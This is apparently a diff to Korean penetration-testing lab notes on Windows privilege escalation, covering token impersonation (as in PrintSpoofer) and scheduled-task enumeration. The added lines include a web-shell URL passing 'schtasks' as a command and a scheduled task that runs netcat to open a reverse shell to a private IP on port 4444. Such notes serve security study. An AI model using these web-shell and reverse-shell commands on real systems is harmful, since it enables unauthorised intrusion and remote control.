@@ -1162,5 +1162,10 @@ SeTimeZonePrivilege Change the time zone Disabled
 시스템 서비스가 인증을 위해 보낸 토큰을 가로채서 그 토큰을 이용해 프로세스를 실행하면, 최고 관리자 권한인 SYSTEM으로 권한이 수직 상승하게 됩니다. (이것이 바로 PrintSpoofer 같은 도구가 작동하는 방식입니다.
 
 - ![](image_9.png)
+- ![](image_11.png)
   schtasks /query /fo LIST /v -> 자동화된 명령어 탐색
   http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v
+
+- ![](image_12.png)
+- wamp windows + apache + mysql/mariadb + php
+  Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.118.23 4444 -e cmd.exe" Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.100.23 4444 -e cmd.exe"
